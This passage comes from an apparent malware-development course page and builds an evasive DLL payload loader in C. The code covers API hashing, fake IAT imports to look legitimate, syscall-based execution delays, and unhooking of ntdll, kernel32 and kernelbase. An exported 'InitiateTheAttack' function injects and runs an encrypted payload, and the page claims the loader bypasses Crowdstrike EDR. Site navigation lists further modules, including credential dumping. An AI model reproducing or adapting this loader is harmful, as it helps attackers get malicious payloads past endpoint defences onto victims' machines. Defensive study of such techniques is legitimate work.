&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	dwImgExportDirSize      = 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	pdwFunctionNameArray    = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfNames);
	pdwFunctionAddressArray = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfFunctions);
	pwFunctionOrdinalArray  = (PWORD) (pBase + 
pImgExportDir-&gt;AddressOfNameOrdinals);


	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
	
		CHAR*	pFunctionName           = (CHAR*)(pBase + 
pdwFunctionNameArray[i]);
		PVOID	pFunctionAddress        = (PVOID)(pBase + 
pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);

		if (CRCHASH(pFunctionName) == uApiHash) {
			
			// Forwarded functions support:
			if ((((ULONG_PTR)pFunctionAddress) &gt;= ((ULONG_PTR)pImgExportDir)) 
&amp;&amp;
				(((ULONG_PTR)pFunctionAddress) &lt; ((ULONG_PTR)pImgExportDir) + 
dwImgExportDirSize)
				) {

				CHAR	cForwarderName	[MAX_PATH]	 = { 0 };
				DWORD	dwDotOffset			         = 0x00;
				PCHAR	pcFunctionMod			     = NULL;
				PCHAR	pcFunctionName			     = NULL;

				memcpy(cForwarderName, pFunctionAddress, 
strlen((PCHAR)pFunctionAddress));

				for (int i = 0; i &lt; strlen((PCHAR)cForwarderName); i++) {

					if (((PCHAR)cForwarderName)[i] == '.') {
						dwDotOffset = i;			   
						cForwarderName[i] = NULL; 
						break;
					}
				}

				pcFunctionMod	= cForwarderName;
				pcFunctionName	= cForwarderName + dwDotOffset + 1;

				fnLoadLibraryA pLoadLibraryA = 
(fnLoadLibraryA)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
LoadLibraryA_CRC32);
				if (pLoadLibraryA)
					return GetProcAddressH(pLoadLibraryA(pcFunctionMod), 
CRCHASH(pcFunctionName));
			}
			return (FARPROC)pFunctionAddress;
		}

	}

	return NULL;
}
</code></pre>
<h4>HashCalculator Project</h4>
<p>The shared code accompanying this module includes a project named <code>HashCalculator</code>,
 responsible for generating all the necessary hash values required for 
the complete implementation of API hashing within the loader. The image 
below provides an example of the output produced by the <code>HashCalculator</code> program.</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-766503141-e3011cd4-6520-4071-bf75-e143d1314b02.png">
<h3>API Camouflage</h3>
<p>The concept of API camouflage, as introduced in <em>Module 80: IAT Camouflage</em>,
 is a technique used to enhance the obfuscation of the IAT. In this 
technique, non-malicious WinAPIs are incorporated into the code but are 
never actually invoked. This forces the compiler to include these 
WinAPIs in the IAT of the compiled implant, creating the appearance of a
 legitimate application.</p>
<p>When the <code>IatCamouflage</code> function below is invoked, the WinAPIs listed within it are added to the IAT of its implementation.</p>
<pre><code class="language-C">
// Generate a random compile-time seed
int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}


// A dummy function that makes the if-statement in 'IatCamouflage' interesting for the compiler
PVOID Helper(PVOID* ppAddress) {

	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;

	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

	// saving the base address by pointer 
	*ppAddress = pAddress;

	// returning it 
	return pAddress;
}


// Function that imports WinAPIs but never uses them
VOID IatCamouflage() {

	PVOID		pAddress	= NULL;
	int*		A			= (int*)Helper(&amp;pAddress);

	// Impossible if-statement that will never run
	if (*A &gt; 350) {

		// some random whitelisted WinAPIs
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
	}

	// Freeing the buffer allocated in 'Helper'
	HeapFree(GetProcessHeap(), 0, pAddress);
}
</code></pre>
<h3>Delaying Execution</h3>
<p>Delaying execution can help in bypassing virtualized environments, as mentioned in <em>Module 74: Anti-Virtual Environments - Multiple Delay Execution Techniques</em>. However, in our case, it also helps with the unhooking routine. When unhooking DLLs in the loader, having an <code>EXCEPTION_ACCESS_VIOLATION</code>
 exception raised is predictable, and thus handled. However, delaying 
the execution even for a short time before unhooking the target DLLs 
will give time for the current process to effectively execute its 
function calls without interception. This will lower the possibility of 
an exception being raised and thus create a more stable approach without
 triggering the VEH function that will use the RWX memory permission.</p>
<p>The loader will use the <code>NtDelayExecution</code> syscall function for execution delaying via the following <code>DelayExecution</code> function. <code>DelayExecution</code> requires one parameter, <code>fMinutes</code>, which represents the time in minutes for <code>NtDelayExecution</code> to delay. For example, if <code>fMinutes</code> was 0.1, <code>DelayExecution</code> would delay the execution for 6 seconds (60 * 0.1). It is worth noting that <code>NtDelayExecution</code> is called via the HellsHall syscaller, because it is called before the unhooking routine, and thus can be hooked.</p>
<pre><code class="language-C">VOID DelayExecution(IN FLOAT fMinutes) {

	NTSTATUS        STATUS          = 0x00;
	DWORD           dwMilliSeconds  = fMinutes * 60000;              // 
Converting minutes to milliseconds  
	LONGLONG        Delay           = dwMilliSeconds * 10000;        // 
Converting from milliseconds to the 100-nanosecond negative time 
interval
	LARGE_INTEGER   DelayInterval   = { .QuadPart = (-1 * Delay) };

	SET_SYSCALL(g_Nt.NtDelayExecution);
	if (!NT_SUCCESS(STATUS = RunSyscall(FALSE, &amp;DelayInterval)) 
&amp;&amp; STATUS != STATUS_TIMEOUT) {
		// failed.
	}

}
</code></pre>
<h3>Printing DLL's Debug Information</h3>
<p>Printing runtime messages from the DLL isn't as straightforward as EXE since it can't rely on the <code>printf</code>
 function alone. Depending on what type of process is loading the DLL 
(i.e. whether it's a console application or a GUI application), the 
behavior of <code>printf</code> differs. If the loading process is a console application, messages printed with <code>printf</code>
 will appear in the same console as the application. However, when 
dealing with a GUI application, understanding what the DLL is doing 
becomes challenging unless it's being debugged, which becomes even more 
complex.</p>
<p>To address this issue and enable runtime message printing from the loader, the following steps should be taken:</p>
<ol>
<li>
<p>Check if the process to which the DLL is attached contains a console using the <a href="https://learn.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> function. <code>GetConsoleWindow</code> returns a handle to the console of the calling process if it exists.</p>
</li>
<li>
<p>If the target process lacks a console, a new console will be created using the <a href="https://learn.microsoft.com/en-us/windows/console/allocconsole">AllocConsole</a> WinAPI.</p>
</li>
</ol>
<p>These steps are implemented in the <code>CreateDebugConsole</code> function below. Additionally, <code>CreateDebugConsole</code> ensures that a new console is only created once, which is due to the <code>g_bCreated</code> global variable that is initialized when <code>CreateDebugConsole</code> generates the initial console.</p>
<pre><code class="language-C">BOOL g_bCreated = FALSE;

VOID CreateDebugConsole() {
    
    if (g_bCreated)
        return;

    if (!GetConsoleWindow() &amp;&amp; AllocConsole()) 
        g_bCreated = TRUE;
}
</code></pre>
<p><code>CreateDebugConsole</code> should be the first function called within the <code>DllMain</code> function of the loader. This ensures that a console is established early on to serve as the destination for output messages.</p>
<h4>Replacing Printf()</h4>
<p>With a console now available, the next step is to create a replacement for the <code>printf</code> function. The motivation behind this is that as the implementation progresses, the CRT library may be removed, resulting in <code>printf</code> not working anymore.</p>
<p>To address this, the provided <code>PRINT</code> macro is introduced, which uses the <a href="https://learn.microsoft.com/en-us/windows/console/getstdhandle">GetStdHandle</a> and <a href="https://learn.microsoft.com/en-us/windows/console/writeconsole">WriteConsoleA</a> WinAPIs to facilitate message writing to the process's console.</p>
<pre><code class="language-C">#define ERROR_BUF_SIZE					(MAX_PATH * 2)

#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  
</code></pre>
<p>The majority of the <code>PRINT</code> macro calls utilize the following two macros:</p>
<ol>
<li><code>__FILE__</code> - This is a predefined compiler macro used to obtain the current source code file's path. Because <code>__FILE__</code> retrieves the entire file path, a new macro called <code>GET_FILENAME</code> is introduced to extract only the file's name from the path provided by <code>__FILE__</code>. The <code>GET_FILENAME</code> macro is defined as follows:</li>
</ol>
<pre><code class="language-C">#define GET_FILENAME(path) (strrchr(path, '\\') ? strrchr(path, '\\') + 1 : path)
// Example usage: GET_FILENAME(__FILE__)
</code></pre>
<ol start="2">
<li><code>__LINE__</code> - Another predefined macro, <code>__LINE__</code>, serves to retrieve the current line number within a source code file.</li>
</ol>
<h4>Enabling Debug Mode</h4>
<p>The loader contains multiple <code>PRINT</code> calls throughout its functions for a verbose output. These <code>PRINT</code> calls will only be active if the <code>DEBUG</code> macro is defined, which is achieved through the <code>#define DEBUG</code> directive.</p>
<h3>DllMain Function</h3>
<p>The <code>DllMain</code> function serves as the initial point of execution when the DLL is loaded into a running process. The <code>DllMain</code> function in this loader is displayed below. It performs two main tasks: first, it calls the <code>CreateDebugConsole</code> function if debug mode is enabled, and second, it utilizes the <code>GetResourcePayload</code> function to retrieve details about the payload from the resource section.</p>
<p>Unhooking and payload injection procedures are carried out in a separate function, distinct from the <code>DllMain</code> function. This is due to the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices">DLL load lock</a> problem, which will be explained in more detail in the upcoming module <em>Introduction To DLL Sideloading</em>. In short, the loader should not execute core functionality from <code>DllMain</code> and instead should be from an exported function.</p>
<pre><code class="language-C">#define 	CTAES_PAYLOAD_ID                 0x5A		// Set by the compiler when creating the .rc file 

PBYTE		g_pRsrcPayloadBuffer		= NULL;		
DWORD		g_dwRsrcPayloadSize		= 0x00;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

	switch (dwReason) {

	case DLL_PROCESS_ATTACH: {

#ifdef DEBUG
		CreateDebugConsole();
#endif

		if (!GetResourcePayload(hModule, CTAES_PAYLOAD_ID, &amp;g_pRsrcPayloadBuffer, &amp;g_dwRsrcPayloadSize)) {
#ifdef DEBUG
			PRINT("[!] Failed To Fetch The Payload From The Resource Section - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif 
			return FALSE;
		}

		break;
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}
</code></pre>
<h3>InitiateTheAttack Function</h3>
<p>Recall that due to the DLL load lock issue, the primary function 
responsible for executing the core features of the loader will be from 
an exported function called <code>InitiateTheAttack</code>. This function carries out the following tasks:</p>
<ol>
<li>
<p>It verifies the success of the earlier execution of the <code>GetResourcePayload</code> function by checking the values of the global variables <code>g_pRsrcPayloadBuffer</code> and <code>g_dwRsrcPayloadSize</code>.</p>
</li>
<li>
<p>It invokes the <code>IatCamouflage</code> function to import fake functions and DLLs into the IAT.</p>
</li>
<li>
<p>It utilizes the <code>AddWin32uToIat</code> function to ensure that <code>shell32.dll</code> is imported. This is important because when <code>shell32.dll</code> is loaded, it loads <code>win32u.dll</code>, which contains the necessary <code>syscall</code> instructions.</p>
</li>
<li>
<p>It calls <code>InitIndirectSyscalls</code> to initialize the global <code>g_Nt</code> structure. As previously explained, this structure holds the essential components for making syscall calls via HellsHall.</p>
</li>
<li>
<p>The function introduces a delay in execution for a duration specified by the <code>g_NT_DELAY_TIME</code> variable, using the <code>DelayExecution</code> function.</p>
</li>
<li>
<p>It establishes a VEH function through <code>AddVectoredExceptionHandler</code>, resolved using API hashing with the help of <code>GetProcAddressH</code> and <code>GetModuleHandleH</code>.</p>
</li>
<li>
<p>The function proceeds to unhook the DLLs <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code> by invoking <code>UnhookAllLoadedDlls</code>.</p>
</li>
<li>
<p>Afterward, it removes the VEH using <code>RemoveVectoredExceptionHandler</code>, once again resolved through API hashing with the aid of <code>GetProcAddressH</code> and <code>GetModuleHandleH</code>.</p>
</li>
<li>
<p>The payload is injected using the <code>InjectEncryptedPayload</code> function.</p>
</li>
<li>
<p>Finally, it executes the injected payload using the <code>ExecutePayload</code> function.</p>
</li>
</ol>
<pre><code class="language-C">NT_API		g_Nt                 = { 0 }; 
FLOAT		g_NT_DELAY_TIME      = 0.3;  // Delay execution for 0.3 minute

extern __declspec(dllexport) int InitiateTheAttack() {

	PVOID		pVehHandler			= NULL,
			    pInjectedPayload		= NULL;

	// DllMain failed to fetch the payload
	if (!g_pRsrcPayloadBuffer || !g_dwRsrcPayloadSize)
		return -1;

	// Add fake imports to the IAT
	IatCamouflage();

	// Force win32u.dll to be loaded
	AddWin32uToIat();

	fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     =
 
(fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32),
 AddVectoredExceptionHandler_CRC32);
	fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  =
 
(fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32),
 RemoveVectoredExceptionHandler_CRC32);

	if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler) {
#ifdef DEBUG
		PRINT("[!] Failed To Fetch One Or More Function Pointers - %s.%d \n", 
GET_FILENAME(__FILE__), __LINE__);
#endif 
		return -1;
	}

	// Initialize indirect syscalls structure
	if (!InitIndirectSyscalls(&amp;g_Nt)) {
		return -1;
	}


#ifdef DELAY
#ifdef DEBUG
	PRINT("[i] Delaying Execution For %d Seconds ... ", 
(DWORD)(g_NT_DELAY_TIME * 60));
#endif
	DelayExecution(g_NT_DELAY_TIME);
#ifdef DEBUG
	PRINT("[+] DONE \n");
#endif
#endif // DELAY

	// Start the VEH 
	pVehHandler = pAddVectoredExceptionHandler(1, 
VectoredExceptionHandler);
	if (pVehHandler == NULL) {
#ifdef DEBUG
		PRINT("[!] AddVectoredExceptionHandler Failed With Error: %d - %s.%d 
\n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif 
		return -1;
	}

	// Unhook loaded dlls
	UnhookAllLoadedDlls();

	if (!pRemoveVectoredExceptionHandler(pVehHandler)) {
#ifdef DEBUG
		PRINT("[!] RemoveVectoredExceptionHandler Failed With Error: %d - 
%s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif 
		return -1;
	}

	// Write the payload
	if (!InjectEncryptedPayload(g_pRsrcPayloadBuffer, g_dwRsrcPayloadSize, 
&amp;pInjectedPayload)) {
#ifdef DEBUG
		PRINT("[!] Failed To Inject The Payload - %s.%d \n", 
GET_FILENAME(__FILE__), __LINE__);
#endif 
		return -1;
	}

#ifdef DEBUG
	PRINT("\n\t\t[*]========&gt; Executing The Payload In %d Seconds 
&lt;========[*]\n", PAYLOAD_EXEC_DELAY);
#endif 
	ExecutePayload(pInjectedPayload);

	return 0;
}
</code></pre>
<h3>CRT Library Removal</h3>
<p>When constructing a loader, it's crucial to make adjustments to the 
compiler's configuration as the final step. The process of removing the 
CRT library was initially discussed in <em>Module 79: CRT Library Removal &amp; Malware Compiling</em> module and was then put into practice in <em>Module 81: Bypassing AVs</em> module. By following the procedures outlined in the those modules, certain functions must be replaced with custom versions.</p>
<h4>Replacing rand()</h4>
<p><code>rand()</code> is replaced with <code>GenerateRandomInt</code>.</p>
<pre><code class="language-C">unsigned int GenerateRandomInt()  {
    static unsigned int state = 123456789;
    state ^= state &lt;&lt; 13;
    state ^= state &gt;&gt; 17;
    state ^= state &lt;&lt; 5;
    return state;
}
</code></pre>
<h4>Replacing wcscat()</h4>
<p><code>wcscat</code> is replaced with <code>Wcscat</code>.</p>
<pre><code class="language-C">VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource) {
    while (*pDest != 0)
        pDest++;

    while (*pSource != 0) {
        *pDest = *pSource;
        pDest++;
        pSource++;
    }

    *pDest = 0;
}
</code></pre>
<h4>Replacing memcpy()</h4>
<p><code>memcpy</code> is replaced with <code>Memcpy</code>.</p>
<pre><code class="language-C">VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength) {

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--)
        *D++ = *S++;
}
</code></pre>
<h4>Intrinsic Functions</h4>
<p>In addition to function replacements at runtime, the compiler required a custom declaration for the <code>memset</code> and <code>strrchr</code> functions, which is done via the <code>intrinsic</code> keyword. Again, this was introduced and used in the previously mentioned modules.</p>
<pre><code class="language-C">// replaces 'memset' while compiling
extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- &gt; 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}


// replaces 'strrchr' while compiling. 
extern void* __cdecl strrchr(const char*, int);

#pragma intrinsic(strrchr)
#pragma function(strrchr)
char* strrchr(const char* str, int c) {
    char* last_occurrence = NULL;  
    while (*str) {
        if (*str == c) {
            last_occurrence = (char*)str;  
        }
        str++;
    }

    return last_occurrence;
}
</code></pre>
<h3>Results</h3>
<p>Once all the necessary compiler configurations have been established, our DLL loader, named <code>DllLoader.dll</code>, will only import the following functions when debug mode is disabled:</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-866766950-42a0d192-4bac-4fe0-840d-aba4a7062430.png">
<p>Additionally, <code>DllLoader.dll</code> will export a single function, <code>InitiateTheAttack</code>.</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-966766998-4ba1bd16-0b50-4082-8980-622382d69aee.png">
<h3>Bypassing Crowdstrike EDR</h3>
<p>The picture below shows the payload loader evading Crowdstrike EDR.</p>
<img width="800px" style="margin:auto" src="23_files/CS-Bypass-Ldr.png">
<h3>Video Demo</h3>
<video style="margin:auto" width="1400" controls="controls">
  <source src="23_files/DllLdr-demo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Edit the InjectEncryptedPayload function to decrypt the payload after allocating the RWX memory</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Execute the payload via a different callback function</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use a different string hashing algorithm</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="23_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
